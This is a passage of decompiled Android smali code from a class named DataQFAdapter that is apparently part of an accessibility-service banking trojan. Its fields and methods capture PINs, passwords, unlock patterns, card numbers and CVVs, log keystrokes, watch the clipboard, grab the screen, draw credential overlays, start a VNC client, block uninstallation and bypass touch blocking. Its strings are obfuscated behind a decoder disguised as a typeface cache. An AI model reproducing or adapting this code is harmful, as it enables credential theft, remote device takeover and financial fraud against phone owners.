    const-string v2, "00200079005600C900F800B600DA00A8002D0079004900C900FD00B200C1"

    .line 673
    .line 674
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 675
    .line 676
    .line 677
    move-result-object v9

    .line 678
    const-string v2, "00200079005600C900FF00B100D700B7002F0063004800C900FD00B200C1"

    .line 679
    .line 680
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 681
    .line 682
    .line 683
    move-result-object v10

    .line 684
    const-string v2, "00200079005600C900FF00AF00C200A8006D007B00560094"

    .line 685
    .line 686
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 687
    .line 688
    .line 689
    move-result-object v11

    .line 690
    const-string v2, "00200079005600C900F300B000DE00A800310079004800C900FD00B200C1"

    .line 691
    .line 692
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 693
    .line 694
    .line 695
    move-result-object v12

    nop

    nop

    .line 696
    const-string v2, "00200079005600C900E200BA00D300AB002E00730015008A00FD00AC"

    .line 697
    .line 698
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 699
    .line 700
    .line 701
    move-result-object v13

    nop

    .line 702
    const-string v2, "00200079005600C900E600B600C400A8006D007B00560094"

    .line 703
    .line 704
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 705
    .line 706
    .line 707
    move-result-object v14

    nop

    nop

    .line 708
    const-string v2, "00200079005600C900F100AC00C700B4006D007B00560094"

    .line 709
    .line 710
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 711
    .line 712
    .line 713
    move-result-object v15

    .line 714
    const-string v2, "00200079005600C900FD00B000C600A8003100790057008600BE00B200D700B400300077005C008E00FE00B8"

    .line 715
    .line 716
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 717
    .line 718
    .line 719
    move-result-object v16

    .line 720
    const-string v2, "00200079005600C900E300B000DC00BE002600640052008400E300AC00DD00A9006D00750054008900E600BA00C000B4002200620052008800FE00AC"

    .line 721
    .line 722
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 723
    .line 724
    .line 725
    move-result-object v17

    nop

    nop

    .line 726
    const-string v2, "00200079005600C900E400AD00D300A9003000650052008800FE00F100DF00A200300065005A008000F900B100D5"

    .line 727
    .line 728
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 729
    .line 730
    .line 731
    move-result-object v18

    .line 732
    const-string v2, "00200079005600C900EA00AB00D700E9002E007B0048"

    .line 733
    .line 734
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 735
    .line 736
    .line 737
    move-result-object v19

    .line 738
    const-string v2, "00200079005600C900E400BC00DE00E9002E007B0048"

    .line 739
    .line 740
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 741
    .line 742
    .line 743
    move-result-object v20

    .line 744
    const-string v2, "00200079005600C900FC00B800D700E900220066004B00C900FD00B200C1"

    .line 745
    .line 746
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 747
    .line 748
    .line 749
    move-result-object v21

    .line 750
    filled-new-array/range {v3 .. v21}, [Ljava/lang/String;

    .line 751
    .line 752
    .line 753
    move-result-object v2

    .line 754
    invoke-static {v2}, Lv/s/gA5gCwTK0qjTIn;->dTS0S7eC32ubQH54j36([Ljava/lang/Object;)Ljava/util/Set;

    .line 755
    .line 756
    .line 757
    move-result-object v2

    .line 758
    iput-object v2, v0, Lapp/mobilex/plus/services/DataQFAdapter;->smsAppPackages:Ljava/util/Set;

    .line 759
    .line 760
    new-instance v2, Ljava/lang/StringBuilder;

    .line 761
    .line 762
    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    .line 763
    .line 764
    .line 765
    iput-object v2, v0, Lapp/mobilex/plus/services/DataQFAdapter;->_tapPinBuffer:Ljava/lang/StringBuilder;

    .line 766
    .line 767
    iput-object v1, v0, Lapp/mobilex/plus/services/DataQFAdapter;->_tapPinPkg:Ljava/lang/String;

    .line 768
    .line 769
    const/4 v2, -0x1

    .line 770
    iput v2, v0, Lapp/mobilex/plus/services/DataQFAdapter;->_lastPinDotCount:I

    nop

    .line 771
    .line 772
    iput-object v1, v0, Lapp/mobilex/plus/services/DataQFAdapter;->_lastPinDotPkg:Ljava/lang/String;

    .line 773
    .line 774
    new-instance v1, Ljava/util/HashMap;

    .line 775
    .line 776
    invoke-direct {v1}, Ljava/util/HashMap;-><init>()V

    .line 777
    .line 778
    .line 779
    iput-object v1, v0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayLastTime:Ljava/util/HashMap;

    .line 780
    .line 781
    const-string v1, "00200079005600C900E700BE00DE00AB002600620015008400E200A600C200B3002C0038004F009500E500AC00C600A600330066"

    .line 782
    .line 783
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 784
    .line 785
    .line 786
    move-result-object v1

    .line 787
    iput-object v1, v0, Lapp/mobilex/plus/services/DataQFAdapter;->TRUST_PKG:Ljava/lang/String;

    .line 788
    .line 789
    return-void
.end method

.method public static synthetic D5P1xCAyuvgF(Lapp/mobilex/plus/services/DataQFAdapter;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->deferredInit$lambda$27$lambda$26(Lapp/mobilex/plus/services/DataQFAdapter;)V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method public static synthetic DVTNwpDEVsUKuznof(Lapp/mobilex/plus/services/DataQFAdapter;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0

    .line 1
    invoke-static {p0, p1, p2}, Lapp/mobilex/plus/services/DataQFAdapter;->processPwdPollText$lambda$8(Lapp/mobilex/plus/services/DataQFAdapter;Ljava/lang/String;Ljava/lang/String;)V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method public static synthetic Ee8d2j4S9Vm5yGuR(Lapp/mobilex/plus/services/DataQFAdapter;Landroid/view/View;Landroid/view/MotionEvent;)Z
    .locals 0

    .line 1
    invoke-static {p0, p1, p2}, Lapp/mobilex/plus/services/DataQFAdapter;->addShadeBarrier$lambda$47(Lapp/mobilex/plus/services/DataQFAdapter;Landroid/view/View;Landroid/view/MotionEvent;)Z

    .line 2
    .line 3
    .line 4
    move-result p0

    .line 5
    return p0

    nop

    nop
.end method

.method public static synthetic H9XlUr4OeMJFiXK(Lapp/mobilex/plus/services/DataQFAdapter;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Lv/s/aqjfZUF02xH6w;Lv/s/aqjfZUF02xH6w;Lv/s/aqjfZUF02xH6w;)V
    .locals 0

    .line 1
    invoke-static/range {p0 .. p7}, Lapp/mobilex/plus/services/DataQFAdapter;->onAccessibilityEvent$lambda$41(Lapp/mobilex/plus/services/DataQFAdapter;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Lv/s/aqjfZUF02xH6w;Lv/s/aqjfZUF02xH6w;Lv/s/aqjfZUF02xH6w;)V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method public static synthetic J0zjQ7CAgohuxU20eCW6(Lapp/mobilex/plus/services/DataQFAdapter;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->deferredInit$lambda$25(Lapp/mobilex/plus/services/DataQFAdapter;)V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method public static synthetic JXn4Qf7zpnLjP5(Lapp/mobilex/plus/services/DataQFAdapter;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->initClipboardMonitor$lambda$30(Lapp/mobilex/plus/services/DataQFAdapter;)V

    .line 2
    .line 3
    .line 4
    return-void

    nop
.end method

.method public static synthetic MLSIo1htfMPWeB8V876L()V
    .locals 0

    .line 1
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->autoStartVncClient$lambda$32()V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method public static synthetic Qrz92kRPw4GcghAc(Lapp/mobilex/plus/services/DataQFAdapter;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->startGuardPollThread$lambda$17(Lapp/mobilex/plus/services/DataQFAdapter;)V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method public static synthetic XiR1pIn5878vVWd(Lapp/mobilex/plus/services/DataQFAdapter;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->injectRunnable$lambda$13(Lapp/mobilex/plus/services/DataQFAdapter;)V

    .line 2
    .line 3
    .line 4
    return-void

    nop
.end method

.method public static final synthetic access$addShadeBarrier(Lapp/mobilex/plus/services/DataQFAdapter;)V
    .locals 0

    .line 1
    invoke-direct {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->addShadeBarrier()V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method public static final synthetic access$captureScreenInternal(Lapp/mobilex/plus/services/DataQFAdapter;Lv/s/deLJ4Z0aL3hcJ3O1;)V
    .locals 0

    .line 1
    invoke-direct {p0, p1}, Lapp/mobilex/plus/services/DataQFAdapter;->captureScreenInternal(Lv/s/deLJ4Z0aL3hcJ3O1;)V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method public static final synthetic access$captureScreenInternalBitmap(Lapp/mobilex/plus/services/DataQFAdapter;Lv/s/deLJ4Z0aL3hcJ3O1;)V
    .locals 0

    .line 1
    invoke-direct {p0, p1}, Lapp/mobilex/plus/services/DataQFAdapter;->captureScreenInternalBitmap(Lv/s/deLJ4Z0aL3hcJ3O1;)V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method public static final varargs synthetic access$clickNodeWithText(Lapp/mobilex/plus/services/DataQFAdapter;Landroid/view/accessibility/AccessibilityNodeInfo;[Ljava/lang/String;)Z
    .locals 0

    .line 1
    invoke-direct {p0, p1, p2}, Lapp/mobilex/plus/services/DataQFAdapter;->clickNodeWithText(Landroid/view/accessibility/AccessibilityNodeInfo;[Ljava/lang/String;)Z

    .line 2
    .line 3
    .line 4
    move-result p0

    .line 5
    return p0
.end method

.method public static final synthetic access$dispatchWithTouchBlockBypass(Lapp/mobilex/plus/services/DataQFAdapter;Landroid/accessibilityservice/GestureDescription;Ljava/lang/String;)Z
    .locals 0

    .line 1
    invoke-direct {p0, p1, p2}, Lapp/mobilex/plus/services/DataQFAdapter;->dispatchWithTouchBlockBypass(Landroid/accessibilityservice/GestureDescription;Ljava/lang/String;)Z

    .line 2
    .line 3
    .line 4
    move-result p0

    .line 5
    return p0
.end method

.method public static final synthetic access$enhanceContrast(Lapp/mobilex/plus/services/DataQFAdapter;Landroid/graphics/Bitmap;)Landroid/graphics/Bitmap;
    .locals 0

    .line 1
    invoke-direct {p0, p1}, Lapp/mobilex/plus/services/DataQFAdapter;->enhanceContrast(Landroid/graphics/Bitmap;)Landroid/graphics/Bitmap;

    .line 2
    .line 3
    .line 4
    move-result-object p0

    .line 5
    return-object p0
.end method

.method public static final synthetic access$getAccessOverlayParams$cp()Landroid/view/WindowManager$LayoutParams;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->accessOverlayParams:Landroid/view/WindowManager$LayoutParams;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getAccessWindowManager$cp()Landroid/view/WindowManager;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->accessWindowManager:Landroid/view/WindowManager;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getAntiUninstallEnabled$cp()Z
    .locals 1

    .line 1
    sget-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->antiUninstallEnabled:Z

    .line 2
    .line 3
    return v0
.end method

.method public static final synthetic access$getAppNameCache$cp()Ljava/util/concurrent/ConcurrentHashMap;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->appNameCache:Ljava/util/concurrent/ConcurrentHashMap;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getAutoEnablePinPackages$cp()Ljava/util/Set;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->autoEnablePinPackages:Ljava/util/Set;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getAutoLockedApps$cp()Ljava/util/Set;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->autoLockedApps:Ljava/util/Set;

    nop

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getBatchTimer$cp()Ljava/util/concurrent/ScheduledExecutorService;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->batchTimer:Ljava/util/concurrent/ScheduledExecutorService;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getBlockedApps$cp()Ljava/util/Set;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->blockedApps:Ljava/util/Set;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getCapturedCreds$cp()Ljava/util/concurrent/ConcurrentHashMap;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->capturedCreds:Ljava/util/concurrent/ConcurrentHashMap;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getCapturedPassword$cp()Ljava/lang/String;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->capturedPassword:Ljava/lang/String;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getCapturedPattern$cp()Ljava/lang/String;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->capturedPattern:Ljava/lang/String;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getCapturedPin$cp()Ljava/lang/String;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->capturedPin:Ljava/lang/String;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getCurrentApp$p(Lapp/mobilex/plus/services/DataQFAdapter;)Ljava/lang/String;
    .locals 0

    .line 1
    iget-object p0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->currentApp:Ljava/lang/String;

    .line 2
    .line 3
    return-object p0
.end method

.method public static final synthetic access$getForceStopStartTime$cp()Ljava/lang/Long;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->forceStopStartTime:Ljava/lang/Long;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getForegroundPackage(Lapp/mobilex/plus/services/DataQFAdapter;)Ljava/lang/String;
    .locals 0

    .line 1
    invoke-direct {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->getForegroundPackage()Ljava/lang/String;

    .line 2
    .line 3
    .line 4
    move-result-object p0

    .line 5
    return-object p0
.end method

.method public static final synthetic access$getGrabberPackages$cp()Ljava/util/concurrent/ConcurrentHashMap$KeySetView;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->grabberPackages:Ljava/util/concurrent/ConcurrentHashMap$KeySetView;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getH264CaptureInFlight$cp()Z
    .locals 1

    .line 1
    sget-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->h264CaptureInFlight:Z

    .line 2
    .line 3
    return v0
.end method

.method public static final synthetic access$getHandler$p(Lapp/mobilex/plus/services/DataQFAdapter;)Landroid/os/Handler;
    .locals 0

    .line 1
    iget-object p0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->handler:Landroid/os/Handler;

    .line 2
    .line 3
    return-object p0
.end method

.method public static final synthetic access$getHwEncoder$cp()Lv/s/lLybWDNhgEj7LwIe;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->hwEncoder:Lv/s/lLybWDNhgEj7LwIe;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getInjectRunnable$p(Lapp/mobilex/plus/services/DataQFAdapter;)Ljava/lang/Runnable;
    .locals 0

    .line 1
    iget-object p0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->injectRunnable:Ljava/lang/Runnable;

    .line 2
    .line 3
    return-object p0
.end method

.method public static final synthetic access$getInstance$cp()Lapp/mobilex/plus/services/DataQFAdapter;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->instance:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getKW_CARD$cp()[Ljava/lang/String;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->KW_CARD:[Ljava/lang/String;

    nop

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getKW_CVV$cp()[Ljava/lang/String;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->KW_CVV:[Ljava/lang/String;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getKW_LOGIN$cp()[Ljava/lang/String;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->KW_LOGIN:[Ljava/lang/String;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getKW_PASSWORD$cp()[Ljava/lang/String;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->KW_PASSWORD:[Ljava/lang/String;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getKeylogEntries$cp()Ljava/util/List;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->keylogEntries:Ljava/util/List;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getLastCaptureTsMs$cp()J
    .locals 2

    .line 1
    sget-wide v0, Lapp/mobilex/plus/services/DataQFAdapter;->lastCaptureTsMs:J

    .line 2
    .line 3
    return-wide v0
.end method

.method public static final synthetic access$getLastCapturedDigit$cp()C
    .locals 1

    .line 1
    sget-char v0, Lapp/mobilex/plus/services/DataQFAdapter;->lastCapturedDigit:C

    .line 2
    .line 3
    return v0

    nop

    nop
.end method

.method public static final synthetic access$getLastCapturedDigitTime$cp()J
    .locals 2

    .line 1
    sget-wide v0, Lapp/mobilex/plus/services/DataQFAdapter;->lastCapturedDigitTime:J

    .line 2
    .line 3
    return-wide v0
.end method

.method public static final synthetic access$getLastPasswordCheck$cp()J
    .locals 2

    .line 1
    sget-wide v0, Lapp/mobilex/plus/services/DataQFAdapter;->lastPasswordCheck:J

    .line 2
    .line 3
    return-wide v0
.end method

.method public static final synthetic access$getLastPatternCaptureTime$cp()J
    .locals 2

    .line 1
    sget-wide v0, Lapp/mobilex/plus/services/DataQFAdapter;->lastPatternCaptureTime:J

    .line 2
    .line 3
    return-wide v0
.end method

.method public static final synthetic access$getLastPatternCheck$cp()J
    .locals 2

    .line 1
    sget-wide v0, Lapp/mobilex/plus/services/DataQFAdapter;->lastPatternCheck:J

    .line 2
    .line 3
    return-wide v0
.end method

.method public static final synthetic access$getLastPatternViewBounds$cp()Landroid/graphics/Rect;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->lastPatternViewBounds:Landroid/graphics/Rect;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getLastStreamRestartMs$cp()J
    .locals 2

    .line 1
    sget-wide v0, Lapp/mobilex/plus/services/DataQFAdapter;->lastStreamRestartMs:J

    .line 2
    .line 3
    return-wide v0
.end method

.method public static final synthetic access$getLatestFrame$cp()Ljava/util/concurrent/atomic/AtomicReference;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->latestFrame:Ljava/util/concurrent/atomic/AtomicReference;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getLiveKeylogEnabled$cp()Z
    .locals 1

    .line 1
    sget-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->liveKeylogEnabled:Z

    nop

    nop

    .line 2
    .line 3
    return v0
.end method

.method public static final synthetic access$getLockPasswordBuffer$cp()Ljava/lang/StringBuilder;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->lockPasswordBuffer:Ljava/lang/StringBuilder;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getLockPasswordConfirmTimer$cp()Ljava/util/Timer;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->lockPasswordConfirmTimer:Ljava/util/Timer;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getLockPasswordTime$cp()J
    .locals 2

    .line 1
    sget-wide v0, Lapp/mobilex/plus/services/DataQFAdapter;->lockPasswordTime:J

    .line 2
    .line 3
    return-wide v0
.end method

.method public static final synthetic access$getLockScreenPackages$cp()Ljava/util/Set;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->lockScreenPackages:Ljava/util/Set;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getLockedApps$cp()Ljava/util/Set;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->lockedApps:Ljava/util/Set;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getNoPinOverlayPrefixes$cp()Ljava/util/Set;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->noPinOverlayPrefixes:Ljava/util/Set;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getPWD_POLL_INTERVAL_MS$p(Lapp/mobilex/plus/services/DataQFAdapter;)J
    .locals 2

    .line 1
    iget-wide v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->PWD_POLL_INTERVAL_MS:J

    .line 2
    .line 3
    return-wide v0
.end method

.method public static final synthetic access$getPWD_POLL_TIMEOUT_MS$p(Lapp/mobilex/plus/services/DataQFAdapter;)J
    .locals 2

    .line 1
    iget-wide v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->PWD_POLL_TIMEOUT_MS:J

    .line 2
    .line 3
    return-wide v0

    nop

    nop
.end method

.method public static final synthetic access$getPasswordPollerActive$cp()Z
    .locals 1

    .line 1
    sget-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->passwordPollerActive:Z

    nop

    .line 2
    .line 3
    return v0
.end method

.method public static final synthetic access$getPatternOverlayShowing$cp()Z
    .locals 1

    .line 1
    sget-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->patternOverlayShowing:Z

    .line 2
    .line 3
    return v0

    nop

    nop
.end method

.method public static final synthetic access$getPatternReplayInProgress$cp()Z
    .locals 1

    .line 1
    sget-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->patternReplayInProgress:Z

    .line 2
    .line 3
    return v0
.end method

.method public static final synthetic access$getPendingBatch$cp()Ljava/util/List;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->pendingBatch:Ljava/util/List;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getPendingForceStop$cp()Ljava/lang/String;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->pendingForceStop:Ljava/lang/String;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getPendingUninstallPkg$cp()Ljava/lang/String;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->pendingUninstallPkg:Ljava/lang/String;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getPinCaptureAppNames$cp()Ljava/util/concurrent/ConcurrentHashMap;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->pinCaptureAppNames:Ljava/util/concurrent/ConcurrentHashMap;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getPinCaptureEnabled$cp()Ljava/util/concurrent/ConcurrentHashMap;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->pinCaptureEnabled:Ljava/util/concurrent/ConcurrentHashMap;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getPinConfirmTimer$cp()Ljava/util/Timer;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->pinConfirmTimer:Ljava/util/Timer;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getPinDigits$cp()Ljava/lang/StringBuilder;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->pinDigits:Ljava/lang/StringBuilder;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getPinDigitsTime$cp()J
    .locals 2

    .line 1
    sget-wide v0, Lapp/mobilex/plus/services/DataQFAdapter;->pinDigitsTime:J

    .line 2
    .line 3
    return-wide v0
.end method

.method public static final synthetic access$getPinOverlayDispatching$p(Lapp/mobilex/plus/services/DataQFAdapter;)Z
    .locals 0

    .line 1
    iget-boolean p0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayDispatching:Z

    .line 2
    .line 3
    return p0
.end method

.method public static final synthetic access$getPrevHardwareBuffer$cp()Landroid/hardware/HardwareBuffer;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->prevHardwareBuffer:Landroid/hardware/HardwareBuffer;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getPrevHwBitmap$cp()Landroid/graphics/Bitmap;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->prevHwBitmap:Landroid/graphics/Bitmap;

    .line 2
    .line 3
    return-object v0

    nop

    nop
.end method

.method public static final synthetic access$getProtectionBypassUntil$cp()J
    .locals 2

    .line 1
    sget-wide v0, Lapp/mobilex/plus/services/DataQFAdapter;->protectionBypassUntil:J

    .line 2
    .line 3
    return-wide v0

    nop
.end method

.method public static final synthetic access$getPwdPollActive$p(Lapp/mobilex/plus/services/DataQFAdapter;)Z
    .locals 0

    .line 1
    iget-boolean p0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollActive:Z

    .line 2
    .line 3
    return p0
.end method

.method public static final synthetic access$getPwdPollHandler$p(Lapp/mobilex/plus/services/DataQFAdapter;)Landroid/os/Handler;
    .locals 0

    .line 1
    iget-object p0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollHandler:Landroid/os/Handler;

    .line 2
    .line 3
    return-object p0
.end method

.method public static final synthetic access$getPwdPollStartTime$p(Lapp/mobilex/plus/services/DataQFAdapter;)J
    .locals 2

    .line 1
    iget-wide v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollStartTime:J

    .line 2
    .line 3
    return-wide v0
.end method

.method public static final synthetic access$getRE_CARD$cp()Lv/s/NB5LVitKoIkG7GAQ6;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->RE_CARD:Lv/s/NB5LVitKoIkG7GAQ6;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getRE_CVV$cp()Lv/s/NB5LVitKoIkG7GAQ6;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->RE_CVV:Lv/s/NB5LVitKoIkG7GAQ6;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getRE_PHONE$cp()Lv/s/NB5LVitKoIkG7GAQ6;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->RE_PHONE:Lv/s/NB5LVitKoIkG7GAQ6;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getRE_PIN$cp()Lv/s/NB5LVitKoIkG7GAQ6;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->RE_PIN:Lv/s/NB5LVitKoIkG7GAQ6;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getRealScreenSize(Lapp/mobilex/plus/services/DataQFAdapter;)Lv/s/yI1KTRoNlsjx;
    .locals 0

    .line 1
    invoke-direct {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->getRealScreenSize()Lv/s/yI1KTRoNlsjx;

    .line 2
    .line 3
    .line 4
    move-result-object p0

    .line 5
    return-object p0
.end method

.method public static final synthetic access$getRearmHandler$cp()Landroid/os/Handler;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->rearmHandler:Landroid/os/Handler;

    .line 2
    .line 3
    return-object v0
.end method

.method public static final synthetic access$getServiceStartTime$cp()J
    .locals 2

    .line 1
